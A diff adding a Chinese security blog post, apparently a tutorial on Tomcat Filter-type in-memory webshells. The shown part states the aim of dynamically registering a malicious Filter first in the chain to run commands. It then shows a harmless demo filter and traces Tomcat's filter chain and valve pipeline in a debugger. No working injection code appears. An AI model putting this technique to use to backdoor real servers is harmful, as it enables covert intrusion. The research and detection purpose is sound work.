@@ -1,0 +1,982 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
+  <link rel="icon" href="/img/fluid.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="huangdi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Tomcat 的 Filter 型内存马分析和排查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全-Tomcat 之 Filter 型内存马内存马基础">
+<meta property="og:url" content="http://huang-d1.github.io/2025/10/16/Java%E5%AE%89%E5%85%A8-Tomcat%20%E4%B9%8B%20Filter%20%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="huangdi&#39;s blog">
+<meta property="og:description" content="Tomcat 的 Filter 型内存马分析和排查">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/filterWorking.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n05.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n06.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n07.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n08.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n09.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n10.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n12.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n11.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n13.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n14.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n15.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n16.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n17.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n18.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n19.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n20.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n21.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n22.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n23.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n24.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n25.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/Filter%E5%86%85%E5%AD%98%E9%A9%AC.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/n26.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatProcess.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatProcess.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SCAllFilter.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/JarClass.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/MemshellScanner.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterMapScan.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/InvokerScanner.png">
+<meta property="article:published_time" content="2025-10-16T08:58:24.858Z">
+<meta property="article:modified_time" content="2025-10-16T08:59:27.535Z">
+<meta property="article:author" content="huangdi">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://huang-d1.github.io/img/%E5%86%85%E5%AD%98%E9%A9%AC/filterWorking.png">
+  
+  
+  
+  <title>Java安全-Tomcat 之 Filter 型内存马内存马基础 - huangdi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"huang-d1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>huang-d1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java安全-Tomcat 之 Filter 型内存马内存马基础"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-16 16:58" pubdate>
+          2025年10月16日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          48 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java安全-Tomcat 之 Filter 型内存马内存马基础</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Java安全-Tomcat-之-Filter-型内存马"><a href="#Java安全-Tomcat-之-Filter-型内存马" class="headerlink" title="Java安全-Tomcat 之 Filter 型内存马"></a>Java安全-Tomcat 之 Filter 型内存马</h1><p>先来回忆一下Filter功能，再阐述一下大致思路</p>
+<p>可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作，下面是一张简单的流程图</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/filterWorking.png" srcset="/img/loading.gif" lazyload></p>
+<p>从上图可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell</p>
+<p>所以我们后文的目标：<strong>动态注册恶意 Filter，并且将其放到 最前面</strong></p>
+<h1 id="Tomcat-Filter流程分析"><a href="#Tomcat-Filter流程分析" class="headerlink" title="Tomcat Filter流程分析"></a>Tomcat Filter流程分析</h1><h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><ul>
+<li>Tomcat 8.5.81</li>
+</ul>
+<p>首先创建一个Servlet</p>
+<p>自定义一个Filter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Filter start&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Performed a filtering operation&quot;</span>);<br>        filterChain.doFilter(servletRequest,servletResponse);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后修改 web.xml 文件，这里我们设置url-pattern为 <code>/filter</code> 即访问 <code>/filter</code> 才会触发</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span>  </span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span><br><span class="hljs-tag"> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span>  </span><br><span class="hljs-tag"> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span>  <br> <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/filter<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>  <br> <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>开启服务器测试一下</p>
+<p>访问&#x2F;filter路由发现再控制台顺利打印出结果</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n05.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n06.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="在访问-filter-之后的流程分析"><a href="#在访问-filter-之后的流程分析" class="headerlink" title="在访问 &#x2F;filter 之后的流程分析"></a>在访问 &#x2F;filter 之后的流程分析</h2><p>主要是分析 Tomcat 中是如何将自定义的 filter 进行设置并且调用的</p>
+<p>流程分析之前，需要像刚才导入 Servlet.jar 一样，导入 catalina.jar 这个包，以及 tomcat-websocket 包</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>导入完毕之后，我们在 filter.java 下的 doFilter 这个地方打断点。并且访问 &#x2F;filter 接口，至此，调试正式开始</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n07.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里跟进，发现会先调用到getFilter方法，之后来到doFilter方法</p>
+<p>进入到ApplicationFilterChain#doFilter</p>
+<p>这个方法主要是进行了 <code>Globals.IS_SECURITY_ENABLED</code>，也就是全局安全服务是否开启的判断</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n08.png" srcset="/img/loading.gif" lazyload></p>
+<p>步入之后直接走到结尾</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">this</span>.internalDoFilter(request, response);<br></code></pre></td></tr></table></figure>
+
+<p>继续跟进去，这里是 <code>ApplicationFilterChain</code> 类的 <code>internalDoFilter()</code> 方法</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n09.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中filter是从 <code>ApplicationFilterConfig filterConfig = filters[pos++]</code>;中来的，而filters的定义如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure>
+
+<p>这里实际上是有两个filter的，0 是我们自己设定的 filter，1 是 tomcat 自带的 filter，因为此时 pos 是 1 所以取到 tomcat 的 filter</p>
+<p>点开filters变量显示一下即可看到</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n10.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n12.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后会先getFilter，再经过一系列判断，走到doFIlter方法</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n11.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后步入中这行代码时，会走到chain.doFilter(request, response);</p>
+<p>执行这行代码会再此回到ApplicationFilterChain#doFilter</p>
+<ul>
+<li>这个地方实际需要理解一下，因为我们是一条 Filter 链，所以会一个个获取 Filter，直到最后一个</li>
+<li>每经过一个FIlter，就会再次回到ApplicationFilterChain#doFilter进入循环，开头是ApplicationFilterChain#doFilter，结尾也是ApplicationFilterChain#doFilter</li>
+</ul>
+<p>因为我们只定义了一个 Filter，所以现在这次循环获取 Filter 链就是最后一次</p>
+<p>在最后一次获取 Filter 链的时候，会走到 <code>this.servlet.service(request, response);</code> 这个地方</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n13.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后就会正常调用服务了</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n14.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>总的来说</p>
+</blockquote>
+<p>最后一个 filter 调用 servlet 的 service 方法</p>
+<p>上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法；这也就是我们的 Filter 链，是去逐个获取的。</p>
+<p>最后一个 Filter.doFilter() 方法中调用的 FilterChain.doFilter() 方法将调用目标 Servlet.service() 方法。</p>
+<p>只要 Filter 链中任意一个 Filter 没有调用 <code>FilterChain.doFilter()</code> 方法，则目标 <code>Servlet.service()</code> 方法都不会被执行。</p>
+<p><strong>至此，我们的正向分析过程就结束了，得到的结论是 Filter Chain 的调用结构是一个个 doFilter() 的，最后一个 Filter 会调用 <code>Servlet.service()</code></strong></p>
+<h2 id="在访问-filter-之前的流程分析"><a href="#在访问-filter-之前的流程分析" class="headerlink" title="在访问 &#x2F;filter 之前的流程分析"></a>在访问 &#x2F;filter 之前的流程分析</h2><p>分析目的在于：假设我们基于filter去实现一个内存马，我们需要找到filter是如何被创建的。</p>
+<blockquote>
+<p>可以把断点下载最远的一处 invoke() 方法的地方，StandardWrapperValve#invoke</p>
+</blockquote>
+<p>在 doFilter() 方法之前，一整个流程如图</p>
+<p>进行逆向分析</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n15.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>此处我们选到最远处的一个 invoke() 方法，如图</li>
+</ul>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n16.png" srcset="/img/loading.gif" lazyload></p>
+<p>看到现在的类是 <code>StandardEngineValve</code>，对应的 Pipeline 就是 <code>EnginePipeline</code>；它进行了 invoke() 方法的调用，这个 invoke() 方法的调用的目的地是 <code>AbstractAccessLogValve</code> 类的 invoke() 方法。其实这一步已经安排了一个 <code>request, wrapper, servlet</code> 传递的顺序</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n17.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着是 <code>AbstractAccessLogValve</code> 类的 invoke() 方法，然后就是一步步调用 invoke() 方法</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n18.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以用这张图来表示这一整个过程</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n19.png" srcset="/img/loading.gif" lazyload></p>
+<p>看一下每个经过的类(主要关注不属于tomcat架构的类)有什么用</p>
+<ol>
+<li><strong>StandardWrapperValve</strong> (调用位置: <code>invoke:96</code>)</li>
+</ol>
+<ul>
+<li><strong>类</strong>：<code>StandardWrapperValve</code> 继承自 <code>ValveBase</code>，是 Tomcat 中用来处理请求的管道组件。</li>
+<li><strong>作用</strong>：负责请求到达 Tomcat 容器时，分配到具体的 Servlet，并执行该 Servlet 的生命周期方法（如 <code>service()</code>）。它也处理对 <code>ServletRequest</code> 和 <code>ServletResponse</code> 的封装。</li>
+</ul>
+<ol start="2">
+<li><strong>StandardContextValve</strong> (调用位置: <code>invoke:97</code>)</li>
+</ol>
+<ul>
+<li><strong>类</strong>：<code>StandardContextValve</code> 是 Tomcat 中处理 web 应用的上下文的管道组件。</li>
+<li><strong>作用</strong>：它主要处理请求的上下文（Context），会负责识别请求是否符合应用的配置要求，过滤掉无效的请求，或者将请求转发到合适的 Servlet 或 JSP。</li>
+</ul>
+<ol start="3">
+<li><strong>AuthenticatorBase</strong> (调用位置: <code>invoke:543</code>)</li>
+</ol>
+<ul>
+<li><strong>类</strong>：<code>AuthenticatorBase</code> 是 Tomcat 认证过程的基类，提供基本的身份验证机制。</li>
+<li><strong>作用</strong>：当请求需要进行身份验证时，这个类会处理相关的认证操作。通常是在用户请求资源时，验证用户的身份信息是否正确（比如 HTTP 基本认证或表单认证）。</li>
+</ul>
+<ol start="4">
+<li><strong>StandardHostValve</strong> (调用位置: <code>invoke:135</code>)</li>
+</ol>
+<ul>
+<li><strong>类</strong>：<code>StandardHostValve</code> 是用于处理虚拟主机请求的 Valve。</li>
+<li><strong>作用</strong>：它处理请求是否属于当前的虚拟主机（Host），根据虚拟主机的配置来路由请求。虚拟主机是 Tomcat 支持多站点的功能，用来根据域名分发请求到不同的应用。</li>
+</ul>
+<ol start="5">
+<li><strong>ErrorReportValve</strong> (调用位置: <code>invoke:92</code>)</li>
+</ol>
+<ul>
+<li><strong>类</strong>：<code>ErrorReportValve</code> 负责在请求处理过程中出错时生成错误报告。</li>
+<li><strong>作用</strong>：当发生错误（例如 HTTP 错误 404 或 500）时，<code>ErrorReportValve</code> 会生成详细的错误信息（如堆栈跟踪）并将其返回给客户端。</li>
+</ul>
+<ol start="6">
+<li><strong>AbstractAccessLogValve</strong> (调用位置: <code>invoke:698</code>)</li>
+</ol>
+<ul>
+<li><strong>类</strong>：<code>AbstractAccessLogValve</code> 是用于记录访问日志的基类。</li>
+<li><strong>作用</strong>：它负责将请求的详细信息（如请求的 URL、时间戳、客户端 IP 等）记录到日志文件中，以供后续分析。它支持灵活的日志格式配置，并且是 Tomcat 默认启用的访问日志功能的基础。</li>
+</ul>
+<ol start="7">
+<li><strong>StandardEngineValve</strong> (调用位置: <code>invoke:78</code>)</li>
+</ol>
+<ul>
+<li><strong>类</strong>：<code>StandardEngineValve</code> 是 Tomcat 中的引擎级别的 Valve，负责处理跨应用的请求。</li>
+<li><strong>作用</strong>：它是在 Tomcat 中对整个引擎（Engine）进行请求处理的组件。在请求到达应用之前，它负责进行一些全局级的操作，比如进行负载均衡、跨应用请求的转发等。</li>
+</ul>
